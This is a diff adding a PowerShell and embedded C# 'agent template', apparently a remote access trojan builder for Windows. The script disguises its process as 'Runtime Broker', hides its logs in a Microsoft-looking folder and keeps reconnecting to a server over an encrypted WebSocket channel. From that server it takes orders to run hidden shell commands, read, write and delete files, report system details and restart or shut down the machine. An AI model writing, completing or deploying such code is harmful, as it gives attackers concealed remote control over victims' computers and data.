@@ -1,0 +1,246 @@
+#Requires -Version 5.1
+# Ai-Arena Agent Template - PowerShell 5.1 / Windows 10-11
+# Placeholders: __SERVER_URL__, __ENC_KEY__, __LICENSE_KEY__
+
+# --- Process disguise ---
+try { [System.Diagnostics.Process]::GetCurrentProcess().MainWindowTitle = "Runtime Broker" } catch {}
+try { $host.UI.RawUI.WindowTitle = "Runtime Broker" } catch {}
+
+# --- Config ---
+$SERVER_URL   = "__SERVER_URL__"
+$ENC_KEY_HEX  = "__ENC_KEY__"
+$LICENSE_KEY  = "__LICENSE_KEY__"
+$LOG_DIR      = Join-Path $env:LOCALAPPDATA "Microsoft\Logs"
+$WS_URL       = "wss://${SERVER_URL}/api/v1/events/?EIO=4&transport=websocket"
+
+# --- C# Agent ---
+$csharp = @'
+using System;using System.Collections.Generic;using System.IO;using System.Linq;
+using System.Net.WebSockets;using System.Security.Cryptography;using System.Text;
+using System.Threading;using System.Threading.Tasks;using System.Diagnostics;
+using System.Management;
+
+namespace AiArena{
+public class Agent{
+    static string _logDir,_wsUrl,_license;
+    static byte[] _key;
+    static ClientWebSocket _ws;
+    static readonly object _lk=new object();
+
+    public static void Run(string logDir,string wsUrl,string keyHex,string license){
+        _logDir=logDir;_wsUrl=wsUrl;_key=HexToBytes(keyHex);_license=license;
+        try{Directory.CreateDirectory(_logDir);}catch{}
+        Log("Agent starting");
+        int delay=5000;
+        while(true){
+            try{ConnectAsync().Wait();}
+            catch(Exception ex){Log("Fatal: "+ex.Message);}
+            Log("Reconnect in "+(delay/1000)+"s");
+            Thread.Sleep(delay);
+            delay=Math.Min(delay+5000,60000);
+        }
+    }
+
+    static async Task ConnectAsync(){
+        using(_ws=new ClientWebSocket()){
+            Log("Connecting to "+_wsUrl);
+            await _ws.ConnectAsync(new Uri(_wsUrl),CancellationToken.None);
+            Log("TCP connected");
+            var buf=new byte[8192];var sb=new StringBuilder();
+            var hb=new Timer(async _=>{if(_ws?.State==WebSocketState.Open)await Send("2");},null,30000,30000);
+
+            while(_ws.State==WebSocketState.Open){
+                sb.Clear();
+                WebSocketReceiveResult r;
+                do{r=await _ws.ReceiveAsync(new ArraySegment<byte>(buf),CancellationToken.None);
+                   if(r.MessageType==WebSocketMessageType.Close){Log("Server closed");return;}
+                   sb.Append(Encoding.UTF8.GetString(buf,0,r.Count));
+                }while(!r.EndOfMessage);
+
+                string raw=sb.ToString();if(string.IsNullOrEmpty(raw))continue;
+                char code=raw[0];string payload=raw.Length>1?raw.Substring(1):"";
+
+                if(code=='0'){// OPEN
+                    Log("EIO open");await Send("40");
+                }else if(code=='2'){// PING
+                    await Send("3");
+                }else if(code=='4'){// MESSAGE
+                    if(payload.StartsWith("0")){// namespace ack
+                        Log("Namespace connected");
+                        string enc=Encrypted("{\"type\":\"auth\",\"licenseKey\":\""+_license+"\"}");
+                        await SendEvent(enc);Log("Auth sent");
+                    }else if(payload.StartsWith("2[")){
+                        // socket.io event: parse ["data","ENCRYPTED"]
+                        string inner=payload.Substring(1);
+                        var args=ParseArray(inner);
+                        if(args!=null&&args.Length>=2){
+                            try{
+                                string json=Decrypt(args[1]);
+                                var cmd=ParseObj(json);
+                                string t=cmd.ContainsKey("type")?cmd["type"]:"";
+                                Log("Cmd: "+t);
+                                if(t=="auth:ok"){Log("Authenticated");await SendSysInfo();}
+                                else{string res=Exec(t,cmd);await SendEvent(Encrypted(res));}
+                            }catch(Exception ex){Log("Event err: "+ex.Message);}
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    // --- Command dispatch ---
+    static string Exec(string t,Dictionary<string,string> cmd){
+        try{
+            switch(t){
+                case "terminal:execute":return RunCmd(cmd["command"]);
+                case "files:list":return JArr(Directory.GetFiles(cmd["path"]??"C:\\"));
+                case "files:read":{
+                    var fi=new FileInfo(cmd["path"]??"");
+                    if(fi.Length>1048576)return "{\"error\":\"File too large\"}";
+                    return JStr(File.ReadAllText(cmd["path"]??""));}
+                case "files:write":File.WriteAllText(cmd["path"]??"",cmd["content"]??"");return "{\"status\":\"ok\"}";
+                case "files:delete":File.Delete(cmd["path"]??"");return "{\"status\":\"ok\"}";
+                case "files:mkdir":Directory.CreateDirectory(cmd["path"]??"");return "{\"status\":\"ok\"}";
+                case "system:info":return SysInfo();
+                case "system:restart":Process.Start("shutdown","/r /t 0");return "{\"status\":\"ok\"}";
+                case "system:shutdown":Process.Start("shutdown","/s /t 0");return "{\"status\":\"ok\"}";
+                default:return "{\"error\":\"unknown\"}";
+            }
+        }catch(Exception ex){return "{\"error\":\""+Esc(ex.Message)+"\"}";}
+    }
+
+    static string RunCmd(string cmd){
+        var p=new ProcessStartInfo{
+            FileName="cmd.exe",Arguments="/c "+cmd,UseShellExecute=false,
+            RedirectStandardOutput=true,RedirectStandardError=true,
+            CreateNoWindow=true,WindowStyle=ProcessWindowStyle.Hidden};
+        var pr=Process.Start(p);
+        string o=pr.StandardOutput.ReadToEnd(),e=pr.StandardError.ReadToEnd();
+        pr.WaitForExit(30000);
+        return "{\"stdout\":"+JStr(o)+",\"stderr\":"+JStr(e)+",\"exitCode\":"+pr.ExitCode+"}";
+    }
+
+    static string SysInfo(){
+        ulong ram=0;
+        try{var s=new ManagementObjectSearcher("SELECT TotalVisibleMemorySize FROM Win32_OperatingSystem");
+        foreach(var o in s.Get())ram=(ulong)o["TotalVisibleMemorySize"]/1024;}catch{}
+        return "{\"hostname\":"+JStr(Environment.MachineName)+",\"os\":"+JStr(Environment.OSVersion.ToString())+
+               ",\"cpuCount\":"+Environment.ProcessorCount+",\"ramMB\":"+ram+
+               ",\"uptimeSec\":"+(Environment.TickCount/1000)+"}";
+    }
+
+    static async Task SendSysInfo(){
+        await SendEvent(Encrypted("{\"type\":\"system:info\",\"data\":"+SysInfo()+"}"));
+    }
+
+    static async Task SendEvent(string d){await Send("42[\"data\",\""+Esc(d)+"\"]");}
+    static async Task Send(string t){
+        if(_ws?.State!=WebSocketState.Open)return;
+        await _ws.SendAsync(new ArraySegment<byte>(Encoding.UTF8.GetBytes(t)),
+            WebSocketMessageType.Text,true,CancellationToken.None);
+    }
+
+    // --- AES-256-CBC + HMAC-SHA256 (v:3) ---
+    static string Encrypted(string plain){
+        byte[] iv=new byte[16],pad=new byte[64];
+        var rng=new RNGCryptoServiceProvider();rng.GetBytes(iv);rng.GetBytes(pad);
+        byte[] data=Encoding.UTF8.GetBytes(plain+"|"+Convert.ToBase64String(pad));
+        byte[] cipher;
+        using(var aes=Aes.Create()){aes.Key=_key;aes.Mode=CipherMode.CBC;aes.Padding=PaddingMode.PKCS7;
+            using(var enc=aes.CreateEncryptor(iv))using(var ms=new MemoryStream())
+            {using(var cs=new CryptoStream(ms,enc,CryptoStreamMode.Write))cs.Write(data,0,data.Length);cipher=ms.ToArray();}}
+        byte[] hmacIn=new byte[iv.Length+cipher.Length];
+        Buffer.BlockCopy(iv,0,hmacIn,0,iv.Length);Buffer.BlockCopy(cipher,0,hmacIn,iv.Length,cipher.Length);
+        string mac;using(var h=new HMACSHA256(_key)){mac=BytesToHex(h.ComputeHash(hmacIn));}
+        return "{\"v\":3,\"iv\":\""+BytesToHex(iv)+"\",\"data\":\""+Convert.ToBase64String(cipher)+
+               "\",\"mac\":\""+mac+"\",\"p\":64,\"ts\":"+DateTimeOffset.UtcNow.ToUnixTimeMilliseconds()+"}";
+    }
+
+    static string Decrypt(string json){
+        var o=ParseObj(json);string ivH=o["iv"],d64=o["data"],macH=o["mac"];
+        byte[] iv=HexToBytes(ivH),cipher=Convert.FromBase64String(d64);
+        byte[] hmacIn=new byte[iv.Length+cipher.Length];
+        Buffer.BlockCopy(iv,0,hmacIn,0,iv.Length);Buffer.BlockCopy(cipher,0,hmacIn,iv.Length,cipher.Length);
+        string mac;using(var h=new HMACSHA256(_key)){mac=BytesToHex(h.ComputeHash(hmacIn));}
+        if(mac.Length!=macH.Length||!SlowEq(mac,macH))throw new Exception("HMAC mismatch");
+        byte[] plain;using(var aes=Aes.Create()){aes.Key=_key;aes.Mode=CipherMode.CBC;aes.Padding=PaddingMode.PKCS7;
+            using(var dec=aes.CreateDecryptor(iv))using(var ms=new MemoryStream())
+            {using(var cs=new CryptoStream(ms,dec,CryptoStreamMode.Write))cs.Write(cipher,0,cipher.Length);plain=ms.ToArray();}}
+        string s=Encoding.UTF8.GetString(plain);int p=s.LastIndexOf('|');
+        return p>0?s.Substring(0,p):s;
+    }
+
+    static bool SlowEq(string a,string b){int d=0;for(int i=0;i<a.Length;i++)d|=a[i]^b[i];return d==0;}
+
+    // --- JSON helpers (minimal) ---
+    static string JStr(string s){return "\""+Esc(s??"")+"\"";}
+    static string JArr(string[] arr){
+        var sb=new StringBuilder("[");for(int i=0;i<arr.Length;i++){
+            if(i>0)sb.Append(",");sb.Append(JStr(arr[i]));}sb.Append("]");return sb.ToString();}
+    static string Esc(string s){
+        var sb=new StringBuilder();foreach(char c in s){
+            if(c=='"')sb.Append("\\\"");else if(c=='\\')sb.Append("\\\\");
+            else if(c=='\n')sb.Append("\\n");else if(c=='\r')sb.Append("\\r");
+            else if(c=='\t')sb.Append("\\t");else if(c<32)sb.AppendFormat("\\u{0:X4}",(int)c);
+            else sb.Append(c);}return sb.ToString();}
+    static string Unesc(string s){
+        var sb=new StringBuilder();for(int i=0;i<s.Length;i++){
+            if(s[i]=='\\'&&i+1<s.Length){i++;char c=s[i];
+                sb.Append(c=='"'?'"':c=='\\'?'\\':c=='n'?'\n':c=='r'?'\r':c=='t'?'\t':c);}
+            else sb.Append(s[i]);}return sb.ToString();}
+
+    // Simple {"k":"v"} parser
+    static Dictionary<string,string> ParseObj(string s){
+        var d=new Dictionary<string,string>();s=s.Trim();if(!s.StartsWith("{"))return d;
+        int depth=0;bool inStr=false;string key=null;int vs=0;
+        for(int i=1;i<s.Length-1;i++){
+            char c=s[i];
+            if(c=='"'&&(i==0||s[i-1]!='\\')){inStr=!inStr;continue;}
+            if(inStr)continue;
+            if(c=='{'||c=='[')depth++;if(c=='}'||c==']')depth--;
+            if(c==':'&&depth==0&&key==null){key=Unquote(s.Substring(1,i-1).Trim());vs=i+1;}
+            if((c==','&&depth==0||depth==-1)&&key!=null){
+                d[key]=ParseVal(s.Substring(vs,i-vs).Trim());key=null;}}
+        return d;}
+
+    static string ParseVal(string s){
+        s=s.Trim();
+        if(s.StartsWith("\""))return Unquote(s);
+        if(s=="true")return "true";if(s=="false")return "false";if(s=="null")return "";
+        return s;}
+
+    // Simple ["data","val"] parser
+    static string[] ParseArray(string s){
+        s=s.Trim();if(!s.StartsWith("["))return null;
+        var r=new List<string>();int depth=0;bool inStr=false;int start=1;
+        for(int i=0;i<s.Length;i++){
+            char c=s[i];
+            if(c=='"'&&(i==0||s[i-1]!='\\')){inStr=!inStr;continue;}
+            if(inStr)continue;
+            if(c=='['||c=='{')depth++;if(c==']'||c=='}')depth--;
+            if(c==','&&depth==1){r.Add(Unquote(s.Substring(start,i-start).Trim()));start=i+1;}
+            if(c==']'&&depth==0){string last=s.Substring(start,i-start).Trim();
+                if(last.Length>0)r.Add(Unquote(last));break;}}
+        return r.Count>0?r.ToArray():null;}
+
+    static string Unquote(string s){
+        if(s.StartsWith("\"")&&s.EndsWith("\"")&&s.Length>=2)s=s.Substring(1,s.Length-2);
+        return Unesc(s);}
+
+    // --- Logging ---
+    static void Log(string msg){
+        try{string e="["+DateTime.UtcNow.ToString("o")+"] "+msg;
+            string f=Path.Combine(_logDir,"agent_"+DateTime.UtcNow.ToString("yyyyMMdd")+".log");
+            lock(_lk){File.AppendAllText(f,e+Environment.NewLine);}}catch{}}
+
+    static byte[] HexToBytes(string h){byte[] b=new byte[h.Length/2];
+        for(int i=0;i<h.Length;i+=2)b[i/2]=Convert.ToByte(h.Substring(i,2),16);return b;}
+    static string BytesToHex(byte[] b){var s=new StringBuilder(b.Length*2);
+        foreach(byte x in b)s.Append(x.ToString("x2"));return s.ToString();}
+}
+}
+'@
+
+Add-Type -TypeDefinition $csharp -Language CSharp -ReferencedAssemblies System.Net.WebSockets,System.Management -ErrorAction Stop
+[AiArena.Agent]::Run($LOG_DIR, $WS_URL, $ENC_KEY_HEX, $LICENSE_KEY)
